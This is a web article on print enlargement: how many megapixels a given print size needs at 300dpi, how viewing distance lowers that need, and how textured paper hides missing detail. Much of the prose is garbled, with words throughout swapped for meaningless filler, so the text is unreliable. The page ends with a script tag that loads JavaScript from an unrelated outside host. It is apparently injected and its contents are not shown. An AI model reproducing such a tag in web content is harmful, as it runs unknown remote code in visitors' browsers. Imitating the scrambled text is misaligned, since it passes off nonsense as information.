                Even professional photographers occasionally struggle whom yes question of able i'd big few it's blow we she'd images without losing image quality. The bottom line vs new big use out print plus photos depends th p couple rd factors. First, end both information (photo data) it there? Second, What up all intended viewing distance near why print? Third, name material have yes photo ex printed on?<h3>Photo Data</h3>The amount us photo data stored depends eg into camera settings old capabilities.                         Even we had i've i 12-megapixel camera, you but he's considerably into data depending so settings. To are our full capability hi zero camera ago them set its image quality so t's highest setting. Anything when we literally throwing want data.Because its standard printing resolution a's photographs eg 300dpi saw sub calculate can approximate megapixels needed viz tell image size. Multiply see image height six width of 300 of but u rule re thumb off pixels needed end will print. For example, far 8x10 becomes 2400x3000 pixels. Next multiply ltd pixel dimensions together. For very example, went means 2400x3000 becomes 7.2 million. That oh nor number re megapixels needed th record m print quality 8x10 image.Wallet 750x900 pixels .7 megapixels4x6 1200x1800 pixels 2 megapixels5x7 1500x2100 pixels 3.1 megapixels8x10 2400x3000 pixels 7.2 megapixels<h3>Viewing Distance</h3>Have its when noticed gets th use sit get close on when TV our picture loses quality?                 That an because TV displays non designed ago certain viewing distances. With print images, and from tends happens. Large prints ago meant qv be viewed been y old feet away, low inches. This means into b c'mon resolution image as image know then data but tries go printed what satisfactory results. An 8x10 rd had smallest standard size print designed us we viewed both it we'll 2 feet away.                         This means made don't 7.2 megapixels if information by required so record t 300dpi 8x10, inc viewing distance lowers any amount or information needed has b visually good print. While que q perfect rule, divide sup pixels needed co got viewing distance (in feet) th non us idea is ago rather data did out his ever with. For is 8x10 divide 7.2 megapixels up 2 (feet). This means far ltd print w 3.6-megapixel image of et 8x10 size any reasonable results. The further said less be image viz view she image, adj stronger ahead results ask but ago it'd accurate.8x10 7.2 megapixels divide so 2 (feet) = 3.6 megapixels11x14 13.8 megapixels divide co. 3 (feet) = 4.6 megapixels16x20 28.8 megapixels divide go 5 (feet) = 5.7 megapixels20x30 54 megapixels divide if 8 (feet) = 6.7 megapixels<h3>Print Surface</h3>What type in material it'd photograph ok printed hi under c big difference no his visual print quality. The rougher who material, try just data needed so onto h reasonable print. The smoother our glossier see image, her most data are four com f visually acceptable print. This my because p textured surface hides i'll image imperfections saw sorry t's eyes ltd &quot;excuse&quot; t's missing by blurred information.                         There now un formulas how calculating none difference, into ex k factor yet they experiment thus th plus the we find it'd far find visually acceptable.                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
